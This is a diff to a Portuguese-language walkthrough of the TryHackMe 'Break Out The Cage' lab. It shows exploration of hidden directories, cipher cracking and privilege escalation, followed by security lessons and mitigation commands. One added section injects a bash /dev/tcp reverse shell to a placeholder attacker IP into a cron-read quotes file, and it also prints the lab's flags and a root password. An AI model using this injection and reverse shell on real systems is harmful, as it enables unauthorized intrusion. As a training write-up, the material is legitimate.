@@ -2,21 +2,25 @@
 ---
 # Introdução
 
-O laboratório ["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1) da TryHackMe é um desafio de segurança cibernética focada em técnicas de exploração web, análise, forense e quebra de cifras. Baseado no tema do ator Nicholas Cage, este laboratório apresenta múltiplas camadas de segurança que precisam ser contornadas para obter acesso ao sistema.
+O laboratório ["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1) da TryHackMe é um exercício prático e envolvente de segurança ofensiva que simula um cenário realista de penetração em sistemas Linux. Ambientado no universo cinematográfico de Nicholas Cage, este desafio técnico apresenta múltiplas camadas de segurança que demonstram como vulnerabilidades aparentemente isoladas podem ser encadeadas para comprometer completamente um sistema.
 
 ## Objetivos Principais:
 
-1. Explorar serviços expostos (FTP, HTTP)
-2. Analisar e decodificar mensagens criptografadas
-3. Identificar e explorar vulnerabilidades web
-4. Obter acesso ao sistema e escalar privilégios
+Este laboratório foi projetado para desenvolver habilidades práticas em:
+
+- **Análise forense digital**: Exame de arquivos e mídias para extração de dados ocultos
+- **Criptoanálise aplicada**: Quebra de cifras clássicas e modernas em contextos reais
+- **Exploração de serviços**: Identificação e aproveitamento de configurações inseguras
+- **Escalação de privilégios**: Técnicas avançadas para elevação de acesso em sistemas Linux
 
 ## Habilidades Desenvolvidas
 
-- Enumeração de rede e serviços
-- Análise de arquivos e esteganografia
-- Quebra de cifras (Base64, Vigenère)
-- Exploração de vulnerabilidades web
+A estrutura do laboratório segue uma progressão lógica que reflete metodologias de teste de penetração profissionais:
+
+1. **Reconhecimento passivo e ativo**: Identificação de serviços e coleta de informações
+2. **Análise de vulnerabilidades**: Avaliação de pontos fracos em configurações e códigos
+3. **Exploração controlada**: Aplicação de técnicas específicas para cada vulnerabilidade
+4. **Pós-exploração**: Manutenção de acesso e movimento lateral no sistema
 
 ---
 # Mapeamento da Rede
@@ -623,23 +627,494 @@ Weston (escreve) → spread_the_quotes.py (modificado) → Executado como cage �
 ```
 
 ---
+# Análise e Exploração do Sistema
+
+## Exploração do Diretório `/opt/.dads_scripts`
+
+O próximo passo é investigar o diretório `/opt/.dads_scripts` para entender melhor o sistema e encontrar vetores de exploração.
+
+## Localizando o Diretório Oculto
+
+Ao navegar para `/opt`, inicialmente pode parecer que o diretório `.dads_scripts` não existe:
+
+```bash
+cd /opt
+ls
+```
+
+Isso ocorre porque **diretórios com nomes começando com ponto (.) são ocultos** no Linux. Para visualizá-los:
+
+```bash
+ls -al
+```
+
+**Explicação do comando:**
+
+- `-a`: Mostra todos os arquivos, incluindo ocultos    
+- `-l`: Formato longo (lista detalhada)
+
+**Resultado:**
+
+```text
+drwxr-xr-x  3 root root 4096 May 25  2020 .
+drwxr-xr-x 24 root root 4096 May 26  2020 ..
+drwxr-xr-x  3 cage cage 4096 May 26  2020 .dads_scripts
+```
+
+**Análise das permissões:**
+
+- `drwxr-xr-x`: Diretório com permissões 755
+    - Dono (cage): leitura, escrita, execução
+    - Grupo (cage): leitura e execução
+    - Outros: leitura e execução
+- `cage cage`: Proprietário e grupo são ambos "cage"
+
+## Investigando o Conteúdo
+
+```bash
+cd .dads_scripts
+ls -al
+```
+
+**Resultado:**
+
+```text
+drwxrwxr-x 2 cage cage 4096 May 25  2020 .files
+-rwxr--r-- 1 cage cage  255 May 26  2020 spread_the_quotes.py
+```
+
+**Análise:**
+
+1. **`.files/`**: Diretório com permissões 775 (grupo tem escrita)
+2. **`spread_the_quotes.py`**: Script Python com permissões 755
+
+## Análise do Script Python
+
+```bash
+cat spread_the_quotes.py
+```
+
+**Código do script:**
+
+```python
+#!/usr/bin/env python
+
+#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
+import os
+import random
+
+lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
+quote = random.choice(lines)
+os.system("wall " + quote)
+```
+
+**Explicação linha por linha:**
+
+1. `#!/usr/bin/env python`: Shebang - especifica que o interpretador Python deve executar o script
+2. `import os`: Importa módulo para interagir com sistema operacional
+3. `import random`: Importa módulo para gerar números aleatórios
+4. `lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()`:
+    - Abre o arquivo `.quotes`
+    - Lê seu conteúdo
+    - Divide em linhas
+    - Armazena na lista `lines`
+
+5. `quote = random.choice(lines)`: Seleciona uma linha aleatória da lista    
+6. `os.system("wall " + quote)`: Executa comando `wall` com a citação selecionada
+
+**Vulnerabilidade identificada:** O script usa `os.system()` concatenando entrada de arquivo sem sanitização.
+
+## Exploração da Vulnerabilidade
+
+### Verificando Permissões
+
+```bash
+cd .files
+ls -al
+```
+
+**Resultado:**
+
+```text
+-rwxrw---- 1 cage cage 4204 May 25  2020 .quotes
+```
+
+**Análise das permissões:**
+
+- `-rwxrw----`: Permissões 760
+    - Dono (cage): leitura, escrita, execução
+    - Grupo (cage): leitura e escrita
+    - Outros: nenhuma permissão
+
+**Implicação:** Se Weston pertence ao grupo `cage`, pode modificar o arquivo `.quotes`.
+
+## Modificando o Arquivo `.quotes`
+
+```bash
+vi .quotes
+```
+
+**Comandos no vi:**
+
+1. `dG`: Apaga todo o conteúdo do arquivo
+    
+    - `d`: Comando delete
+    - `G`: Vai para o final do arquivo
+    - Juntos: deleta da posição atual até o final
+
+## Injetando Payload Malicioso
+
+Substituímos o conteúdo por:
+
+```bash
+; bash -c "bash -i >& /dev/tcp/{ip_atacante}/4444 0>&1"
+```
+
+**Análise do payload:**
+
+1. `;`: Caractere de terminação de comando no shell
+    - Permite executar múltiplos comandos em sequência
+2. `bash -c "..."`: Executa comando bash
+3. `bash -i >& /dev/tcp/{IP_ATACANTE}/4444 0>&1`:
+    - `bash -i`: Shell interativo
+    - `>&`: Redireciona stdout e stderr
+    - `/dev/tcp/{IP_ATACANTE}/4444`: Conecta via TCP ao atacante
+    - `0>&1`: Redireciona stdin para stdout (conecta entrada também)
+
+**Resultado:** Quando o script Python executar `os.system("wall " + quote)`, ele tentará:
+
+```text
+wall ; bash -c "bash -i >& /dev/tcp/{IP_ATACANTE}/4444 0>&1"
+```
+
+O `;` faz o shell executar `wall` (sem argumentos) e depois nosso reverse shell.
+
+## Configurar o Listener
+
+No computador atacante:
+
+```bash
+nc -lvnp 4444
+```
+
+### Aguardando Execução
+
+O script `spread_the_quotes.py` é executado periodicamente (provavelmente via cron job). Após alguns minutos, obtemos conexão como usuário `cage`.
+
+## Como usuário Cage
+
+### Enumeração do Home Directory
+
+Como usuário `cage` podemos em seguida listar o conteúdo da sua home para procurar novos arquivos de interesse usando o comando `ls -al`.
+
+**Resultado:**
+
+```text
+drwx------ 7 cage cage 4096 May 26  2020 .
+drwxr-xr-x 4 root root 4096 May 26  2020 ..
+lrwxrwxrwx 1 cage cage    9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
+drwx------ 2 cage cage 4096 May 25  2020 .cache
+drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
+drwx------ 3 cage cage 4096 May 25  2020 .gnupg
+drwxrwxr-x 3 cage cage 4096 May 25  2020 .local
+-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 cage cage   66 May 25  2020 .selected_editor
+drwx------ 2 cage cage 4096 May 26  2020 .ssh
+-rw-r--r-- 1 cage cage    0 May 25  2020 .sudo_as_admin_successful
+-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
+-rw------- 1 cage cage 6761 May 26  2020 .viminfo
+
+```
+
+O arquivo de interesse para este laboratório é o arquivo `Super_Duper_Checklist`. Ao visualizar o conteúdo do arquivo com `cat`, conseguimos encontrar a segunda flag do laboratório.
+
+```text
+1 - Increase acting lesson budget by at least 30%
+2 - Get Weston to stop wearing eye-liner
+3 - Get a new pet octopus
+4 - Try and keep current wife
+5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
+```
+
+---
+# Escalando para Root
+
+## Investigando Email Backup
+
+O próximo passo é escalar privilégio novamente, mas desta vez para root.
+
+Ainda no usuário `cage` é possível notar o diretório `email_backup` e ao entrar neste diretório podemos listar  e visualizar os conteúdos dos emails.
+
+```bash
+cd email_backup
+ls -al
+```
+
+**Resultado:**
+
+```text
+drwxrwxr-x 2 cage cage 4096 May 25  2020 .
+drwx------ 7 cage cage 4096 May 26  2020 ..
+-rw-rw-r-- 1 cage cage  431 May 25  2020 email_1
+-rw-rw-r-- 1 cage cage  733 May 25  2020 email_2
+-rw-rw-r-- 1 cage cage  745 May 25  2020 email_3
+```
+
+## Análise do `email_3`
+
+Ao visualizar o conteúdo de todos emails foi possível localizar algo de interesse no arquivo `email_3`:
+
+```text
+From - Cage@nationaltreasure.com
+To - Weston@nationaltreasure.com
+
+Hey Son
+
+Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
+down what it said. Could you look into it please? I think it could be something to do with his
+account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
+sure he's out to get me. The note said:
+
+haiinspsyanileph
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd. 
+
+Regards
+
+The Legend - Cage
+```
+
+**Análise:**
+
+1. Texto cifrado: `haiinspsyanileph`
+2. Dicas no texto: múltiplas referências a "FACE"
+3. Provável cifra de Vigenère com chave relacionada a "face"
+
+## Decifrando a Mensagem
+
+Usando [Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher):
+
+- Texto cifrado: `haiinspsyanileph`
+- Chave: `face` (deduzida das dicas no email)    
+- Modo: Decrypt
+
+**Resultado:** `cageisnotalegend`
+
+**Interpretação:** Esta é provavelmente a senha do usuário root ou de outro usuário privilegiado.
+
+## Escalando Para Root
+
+```bash
+su root
+Password: cageisnotalegend
+```
+
+## Buscando a Flag Final
+
+Novamente ao listar todo o conteúdo com `ls -al` no home do usuário root é possível encontrar o diretório `email_backup` presente novamente.
+
+Ao entrar no diretório e visualizando com `cat` os emails, é possível encontrar no `email_2` a chave final do laboratório.
+
+```text
+From - master@ActorsGuild.com
+To - SeanArcher@BigManAgents.com
+
+Dear Sean
+
+I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
+strong... so strong that I feel the power to promote you from disciple to crony. I hope you
+don't abuse your new found strength. To ascend yourself to this level please use this code:
+
+THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
+
+Thank you
+
+Sean Archer
+```
+
+---
 # Resumo das Técnicas Utilizadas
+
+## 1. Reconhecimento e Enumeração
+
+- **Nmap**: Varredura de portas e identificação de serviços
+- **FTP Anônimo**: Acesso não autenticado e download de arquivos
+- **Gobuster**: Enumeração de diretórios web
+
+## 2. Criptoanálise e Esteganografia
+
+- **Base64**: Identificação e decodificação de conteúdo
+- **Vigenère Cipher**: Quebra de cifra usando chave descoberta
+- **Espectrograma**: Análise de arquivo MP3 para dados ocultos
+
+## 3. Exploração de Serviços
+
+- **SSH**: Conexão com credenciais descobertas
+- **FTP**: Transferência de arquivos
+- **HTTP**: Enumeração de conteúdo web
+
+## 4. Escalação de Privilégios
+
+- **SUDO Privileges**: Análise de comandos permitidos via sudo
+- **Cron Job Exploitation**: Manipulação de scripts executados periodicamente
+- **PATH Manipulation**: Exploração de scripts que usam comandos sem path absoluto
+- **Command Injection**: Injeção via ponto-e-vírgula em scripts Python
+
+## 5. Análise Forense
+
+- **LinPEAS**: Enumeração automatizada de vetores de escalação
+- **pspy**: Monitoramento de processos em tempo real
+- **Análise de Logs**: Investigação de arquivos de sistema e usuário
 
 ---
 # Lições de Segurança Aprendidas
 
+## 1. Configurações Inseguras
+
+- **FTP Anônimo**: Nunca habilitar em ambientes de produção
+- **Permissões de Grupo**: Configurações de grupo com escrita podem permitir escalação
+- **SUDO sem Senha**: Comandos sudo sem necessidade de senha são perigosos
+
+## 2. Vulnerabilidades de Código
+
+- **os.system() sem Sanitização**: Concatenar entrada do usuário em comandos shell
+- **Scripts Automatizados**: Tarefas agendadas que executam scripts modificáveis
+- **Hardcoded Credentials**: Credenciais em textos cifrados mas decifráveis
+
+## 3. Falhas Criptográficas
+
+- **Base64 como "Criptografia"**: Base64 é codificação, não criptografia
+- **Cifras Fracas**: Vigenère não é seguro para proteção de dados sensíveis
+- **Chaves Previsíveis**: Chaves derivadas de contexto são vulneráveis
+
+## 4. Falhas Operacionais
+
+- **Diretórios Ocultos**: Não são medidas de segurança efetivas
+- **Backups Inseguros**: Arquivos de backup com informações sensíveis
+- **Comunicação Clara**: Dicas em comunicações podem revelar segredos
+
 ---
 # Sugestões Mitigação
 
+## 1. Fortalecimento de Serviços
+
+```bash
+# Desabilitar FTP anônimo no vsftpd
+echo "anonymous_enable=NO" >> /etc/vsftpd.conf
+systemctl restart vsftpd
+
+# Configurar SSH com autenticação forte
+echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
+echo "PermitRootLogin no" >> /etc/ssh/sshd_config
+systemctl restart sshd
+```
+
+## 2. Controle de Permissões
+
+```bash
+# Revisar permissões de grupo regularmente
+find / -type f -perm -g=w -ls 2>/dev/null | grep -v "/proc/"
+
+# Remover permissões de escrita desnecessárias
+chmod g-w /opt/.dads_scripts/.files/.quotes
+
+# Implementar princípio do menor privilégio
+chown root:root /opt/.dads_scripts/spread_the_quotes.py
+chmod 755 /opt/.dads_scripts/spread_the_quotes.py
+```
+
+## 3. Segurança de Scripts
+
+```python
+# Substituir os.system() por subprocess com sanitização
+import subprocess
+import shlex
+
+# Seguro: usar lista de argumentos
+subprocess.run(["wall", quote])
+
+# Ou sanitizar entrada
+safe_quote = shlex.quote(quote)
+subprocess.run(f"wall {safe_quote}", shell=True)
+```
+
+## 4. Monitoramento e Logging
+
+```bash
+# Configurar auditd para monitorar arquivos sensíveis
+apt install auditd
+auditctl -w /opt/.dads_scripts/.files/.quotes -p wa -k quotes_file
+auditctl -w /opt/.dads_scripts/spread_the_quotes.py -p wa -k quotes_script
+
+# Monitorar tentativas de escalação de privilégios
+echo "auth.* /var/log/auth.log" >> /etc/rsyslog.conf
+```
+
+## 5. Hardening do Sistema
+
+```bash
+# Configurar AppArmor para serviços
+apt install apparmor-profiles
+aa-enforce /usr/sbin/sshd
+aa-enforce /usr/sbin/vsftpd
+
+# Implementar SELinux (para RedHat-based)
+yum install selinux-policy-targeted
+setenforce 1
+
+# Atualizações regulares de segurança
+apt update && apt upgrade -y
+unattended-upgrades --enable
+```
+
+## 6. Educação e Políticas
+
+- **Treinamento**: Conscientização sobre segurança para todos os usuários
+- **Políticas de Senha**: Senhas fortes e únicas para cada serviço
+- **Revisão de Código**: Análise de segurança antes de deploy
+- **Testes de Penetração**: Avaliações regulares de segurança
 
 ---
 # Conclusão
 
+O laboratório "Break Out The Cage" da TryHackMe demonstrou de forma prática e educativa múltiplas vulnerabilidades comuns em sistemas Linux. Através de um cenário envolvente baseado no tema Nicholas Cage, foram abordados:
+
+## Principais Aprendizados
+
+1. **Cadeias de Exploração**: Como vulnerabilidades aparentemente menores podem ser combinadas para comprometer sistemas completamente
+2. **Importância da Enumeração**: A descoberta meticulosa de informações é fundamental para o sucesso
+3. **Criptografia vs Codificação**: Diferença crucial entre mecanismos de segurança reais e falsas sensações de segurança
+
 ---
 # Referências
 
-[PSPY64](https://www.kali.org/tools/pspy/)
-[Sonic Visualiser](https://www.sonicvisualiser.org/download.html)
-[Cipher Identifier da Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)
-[Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher)
-["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1)
+## Ferramentas Utilizadas
+
+### Análise de Rede e Enumeração
+
+- **Nmap** - Scanner de rede: [https://nmap.org/](https://nmap.org/)
+- **Gobuster** - Directory brute-forcing: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
+- **Netcat** - Ferramenta de rede versátil: [https://nc110.sourceforge.io/](https://nc110.sourceforge.io/)
+
+### Análise Forense e Esteganografia
+
+- **Sonic Visualiser** - Análise de espectrograma: [https://www.sonicvisualiser.org/](https://www.sonicvisualiser.org/)
+- **Audacity** - Alternativa para análise de áudio: [https://www.audacityteam.org/](https://www.audacityteam.org/)
+
+### Criptoanálise
+
+- **Cryptii** - Ferramentas criptográficas online: [https://cryptii.com/](https://cryptii.com/)
+- **Boxentriq Cipher Identifier**: [https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)
+- **CyberChef** - Swiss Army knife de criptografia: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+
+### Escalação de Privilégios
+
+- **LinPEAS** - Linux Privilege Escalation Awesome Script: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+- **pspy** - Monitoramento de processos: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+- **GTFOBins** - Binários SUID/escapamento: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+
